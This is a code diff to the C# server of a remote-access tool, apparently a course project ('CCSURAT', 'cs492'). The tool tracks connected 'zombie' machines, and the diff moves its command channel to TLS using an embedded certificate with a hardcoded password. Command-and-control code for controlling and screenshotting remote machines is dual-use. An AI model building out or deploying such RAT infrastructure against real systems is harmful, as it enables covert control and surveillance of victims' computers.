@@ -5,7 +5,11 @@ using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.NetworkInformation;
+using System.Net.Security;
 using System.Net.Sockets;
+using System.Reflection;
+using System.Security.Authentication;
+using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
@@ -24,6 +28,12 @@ namespace CCSURAT_Server
         // Network
         private TcpClient client;
         private NetworkStream netStream;
+
+        // Security
+        private SslStream sslStream;
+        private X509Certificate serverCertificate;
+        private StreamWriter sw;
+        private StreamReader sr;
 
         #region Information
         // Details about the client or client's computer
@@ -55,6 +65,18 @@ namespace CCSURAT_Server
             this.zombieListView = mainForm.zombieListView;
             this.client = client;
             this.netStream = client.GetStream();
+            sslStream = new SslStream(netStream);
+
+            var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("CCSURAT_Server.Resources.Server.pfx");
+            var bytes = new byte[stream.Length];
+            stream.Read(bytes, 0, bytes.Length);
+            serverCertificate = new X509Certificate2(bytes, "cs492");
+
+            sslStream.AuthenticateAsServer(serverCertificate, false, SslProtocols.Tls, false);
+
+            sw = new StreamWriter(sslStream);
+            sr = new StreamReader(sslStream);
+
             this.active = true;
 
             // initialize monitor list
@@ -75,13 +97,13 @@ namespace CCSURAT_Server
             {
                 while (IsAlive() && IsActive())
                 {
-                    if (netStream.DataAvailable)
+                    if (sslStream.CanRead)
                     {
                         try {
                             byte[] bytes = new byte[1024];
                             string data = null;
                             int i;
-                            if ((i = netStream.Read(bytes, 0, bytes.Length)) != 0)
+                            if ((i = sslStream.Read(bytes, 0, bytes.Length)) != 0)
                             {
                                 // convert recieved bytes to string data
                                 data = Encoding.ASCII.GetString(bytes, 0, i);
@@ -145,7 +167,8 @@ namespace CCSURAT_Server
             {
                 // write empty buffer to client to check if connection is alive
                 byte[] empty = new byte[10];
-                netStream.Write(empty, 0, 0);
+                //sslStream.Write(empty, 0, 0);
+                sslStream.Write(empty, 0, 0);
                 //GetPing();
                 //UpdatePing();
                 return true;
@@ -299,10 +322,15 @@ namespace CCSURAT_Server
         // Checks if first command in data is closed.
         private bool FirstCommandIsClosed(string data)
         {
-            string openCommandTag = data.Substring(0, data.IndexOf("]") + 2);
-            openCommandTag = data.Substring(2, openCommandTag.Length - 4);
-            string closeCommandTag = "[[/" + openCommandTag + "]]";
-            return data.Contains(closeCommandTag);
+            try {
+                string openCommandTag = data.Substring(0, data.IndexOf("]") + 2);
+                openCommandTag = data.Substring(2, openCommandTag.Length - 4);
+                string closeCommandTag = "[[/" + openCommandTag + "]]";
+                return data.Contains(closeCommandTag);
+            } catch(Exception ex)
+            {
+                return false;
+            }
         }
 
         // Gets the first command's data.
@@ -322,7 +350,8 @@ namespace CCSURAT_Server
             try {
                 // convert string data to byte array and write it to the stream
                 byte[] data = Encoding.ASCII.GetBytes(s);
-                netStream.Write(data, 0, data.Length);
+                //sslStream.Write(data, 0, data.Length);
+                sslStream.Write(data, 0, data.Length);
                 if (!s.Contains("[[BINARY]]") && !s.Contains("[[SCREENSHOT]]"))
                     Log("Data sent: " + s);
             } catch(Exception ex)
